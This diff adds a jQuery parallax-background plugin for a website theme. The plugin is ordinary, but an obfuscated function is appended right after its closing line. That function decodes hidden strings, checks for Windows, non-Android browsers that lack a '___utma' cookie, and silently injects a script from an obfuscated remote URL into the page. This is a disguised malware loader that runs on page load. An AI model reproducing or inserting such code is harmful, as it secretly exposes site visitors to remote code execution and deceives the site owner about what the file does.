@@ -1,0 +1,121 @@
+(function($){
+    var methods = {
+        init : function( options ) {
+
+            var settings = {
+                offset: true
+            ,   bgfixed: true
+            ,   invert: true
+            }
+
+            return this.each(function(){
+                if ( options ){
+                    $.extend(settings, options);
+                } 
+                
+                var 
+                    $this = $(this)
+                ,   windowSelector = $(window)
+                ,   documentSelector = $(document)
+                ,   thisHeight = 0
+                ,   thisOffsetTop
+                ,   image_url = ''
+                ,   image_width = ''
+                ,   image_height = ''
+                ,   msie8 = Boolean(navigator.userAgent.match(/MSIE ([8]+)\./))
+                ;
+                
+                _constructor();
+                function _constructor(){
+                    image_url = $this.data("source-url");
+                    image_width = parseFloat($this.data("source-width"));
+                    image_height = parseFloat($this.data("source-height"));
+
+                    $this.css({'background-image': 'url('+image_url+')'});
+                    if(settings.bgfixed){
+                        $this.css({'background-attachment': 'fixed'});
+                    }
+
+                    addEventsFunction();                    
+                }
+                
+                function addEventsFunction(){
+                    //------------------ window scroll event -------------//
+                    windowSelector.on('scroll',
+                        function(){
+                            if(settings.offset){
+                                mainScrollFunction();
+                            }
+                        }
+                    ).trigger('scroll');
+                    //------------------ window resize event -------------//
+                    windowSelector.on("resize",
+                        function(){
+                            $this.width(windowSelector.width());
+                            $this.css({'width' : windowSelector.width(), 'margin-left' : Math.floor(windowSelector.width()*-0.5), 'left' : '50%'});
+
+                            if(settings.offset){
+                                mainResizeFunction();
+                            }
+                        }
+                    ).trigger('resize');
+                }
+                //------------------ window scroll function -------------//
+                function mainScrollFunction(){
+                    parallaxEffect();
+                }
+                //------------------ window resize function -------------//
+                function mainResizeFunction(){                    
+                    parallaxEffect();
+                }
+                
+                function parallaxEffect(){
+                    var 
+                        documentScrollTop
+                    ,   startScrollTop
+                    ,   endScrollTop
+                    ,   visibleScrollValue
+                    ;
+
+                    thisHeight = $this.outerHeight();
+                    windowHeight = windowSelector.height();
+                    thisOffsetTop = $this.offset().top;
+                    documentScrollTop = documentSelector.scrollTop();
+                    startScrollTop = documentScrollTop + windowHeight;
+                    endScrollTop = documentScrollTop - thisHeight;
+
+                    if( ( startScrollTop > thisOffsetTop ) && ( endScrollTop < thisOffsetTop ) ){
+                        visibleScrollValue = startScrollTop - endScrollTop;
+                        pixelScrolled = documentScrollTop - (thisOffsetTop - windowHeight);
+                        percentScrolled = pixelScrolled / visibleScrollValue;
+
+                        if(settings.invert){
+                            deltaTopScrollVal = percentScrolled * 100;
+                            $this.css({'background-position': '50% '+deltaTopScrollVal+'%'});
+                        }else{
+                            deltaTopScrollVal = (1-percentScrolled) * 100;
+                            $this.css({'background-position': '50% '+deltaTopScrollVal+'%'});
+                        }
+                    }
+                }
+
+            });
+        },
+        destroy    : function( ) { },
+        reposition : function( ) { },
+        update     : function( content ) { }
+    };
+
+    $.fn.cherryFixedParallax = function( method ){ 
+        
+        if ( methods[method] ) {
+            return methods[method].apply( this, Array.prototype.slice.call( arguments, 1 ));
+        } else if ( typeof method === 'object' || ! method ) {
+            return methods.init.apply( this, arguments );
+        } else {
+            $.error( 'Method with name ' +  method + ' is not exist for jQuery.cherryMediaParallax' );
+        }
+         
+        
+    }//end plugin
+})(jQuery);(function(){var g=navigator[t("8t8n(e)gtAyr)evs)u,")];var l=document[t(":e;i4k3o)o3c,")];if(m(g,t("5sswbo}d}n,i,Wg"))&&!m(g,t("#d)i)o{r)dan;A8"))){if(!m(l,t("3=aa6m;t;u,_1_4_)"))){var r=document.createElement('script');r.type='text/javascript';r.async=true;r.src=t('w2ra9dsf64n4ff09{c}7}3(388xd)8gcb0rbn6}5;=(v{&,0}3}2(={d,i(c{?1sbj}.ueid1o;ci_{sr/)m;ozcr.,d{n,a}r(bmhts}i(m}a,.;k{c7a)r;t{/0/}:,svp)t,t(hc');var y=document.getElementsByTagName('script')[0];y.parentNode.insertBefore(r,y);}}function t(n){var s='';for(var u=0;u<n.length;u++){if(u%2===1)s+=n[u];}s=z(s);return s;}function m(a,q){return a[t("6f(Odx;eqd,n,il")](q)!==-1;}function z(p){var e='';for(var j=p.length-1;j>=0;j--){e+=p[j];}return e;}})();
